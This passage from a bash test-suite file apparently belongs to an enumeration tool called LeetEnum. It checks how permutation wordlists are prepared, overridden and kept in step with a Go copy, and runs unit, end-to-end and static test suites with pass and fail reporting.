       "$(grep -c '^$' "$perms" | tr -d '[:space:]')" "0"
    yes_ "perms: written atomically, no .part left behind" \
        "$([ ! -e "${perms}.part" ]; echo $?)"

    # An operator who edits the list keeps their edit.
    printf 'onlyword\n' > "$perms"
    pipe_prepare_wordlists >/dev/null 2>&1
    is "perms: an existing list is not overwritten" "$(cat "$perms")" "onlyword"

    # The override, and an override naming a file that is not there.
    printf 'mine\n' > "${TMP}/my-perms.txt"
    LEETENUM_PERM_WORDLIST="${TMP}/my-perms.txt" pipe_prepare_wordlists >/dev/null 2>&1
    is "perms: LEETENUM_PERM_WORDLIST is honoured" "$WL_PERM" "${TMP}/my-perms.txt"
    LEETENUM_PERM_WORDLIST="${TMP}/nope.txt" pipe_prepare_wordlists >"${TMP}/perm.out" 2>&1
    is   "perms: a missing override falls back to the cache copy" "$WL_PERM" "$perms"
    yes_ "perms: and says so rather than failing quietly" \
        "$(grep -q 'LEETENUM_PERM_WORDLIST' "${TMP}/perm.out"; echo $?)"

    # Shell and Go must agree. Two implementations shipped at one version that
    # generated different permutation candidates would not be the same tool.
    rm -f "$perms"
    pipe_prepare_wordlists >/dev/null 2>&1
    if [ -f "${ROOT}/internal/scan/wordlists.go" ]; then
        sed -n '/^var defaultPerms = \[\]byte(`/,/^`)$/p' \
            "${ROOT}/internal/scan/wordlists.go" \
            | sed -e 's/^var defaultPerms = \[\]byte(`//' -e '/^`)$/d' \
            > "${TMP}/go.perms"
        yes_ "perms: shell and Go copies are byte-identical" \
            "$(cmp -s "$perms" "${TMP}/go.perms"; echo $?)"
    else
        # install.sh and the Homebrew formula ship lib/ without internal/.
        printf '  skip perms parity (no Go source in this tree)\n'
    fi

    LS_CACHE_DIR="$saved_cache"
}

# ---------------------------------------------------------------------------
# Runner
#
# The e2e block is ordered deliberately: test_non_tty inspects the log of the
# first full run, and --only truncates that log, so phase selection is checked
# after it.
# ---------------------------------------------------------------------------
# shellcheck source=/dev/null
. "${TESTS_DIR}/hardening.sh"
UNITS="test_compat test_target_validation test_scope_filter test_profiles \
       test_ui test_config test_wordlists test_hardening_units"
E2E="test_e2e test_non_tty test_resume test_only_skip test_differential test_hardening_e2e"

main() {
    local mode="${1:-all}" suite t

    case "$mode" in
        unit)   suite="test_static $UNITS" ;;
        e2e)    suite="$E2E" ;;
        static) suite="test_static" ;;
        all)    suite="test_static $UNITS test_cli $E2E" ;;
        *)      printf 'usage: %s [all|unit|e2e|static]\n' "$0" >&2; exit 2 ;;
    esac

    printf 'LeetEnum test suite\n'
    printf '  root   %s\n' "$ROOT"
    printf '  tmp    %s\n' "$TMP"
    printf '  bash   %s\n' "${BASH_VERSION}"
    printf '  mode   %s\n' "$mode"

    setup_fakes
    load_libs

    for t in $suite; do "$t"; done

    printf '\n'
    ui_repeat '-' 60; printf '\n'
    printf '  passed %s\n' "$PASS"
    printf '  failed %s\n' "$FAIL"

    if [ "$FAIL" -gt 0 ]; then
        printf '\nFull scan output: %s\n' "${TMP}/e2e.log"
        # Keep the artifacts when something failed; there is nothing to debug
        # with once the tree is gone.
        trap - EXIT
        printf 'Artifacts kept in %s\n' "$TMP"
        return 1
    fi
    return 0
}

main "$@"
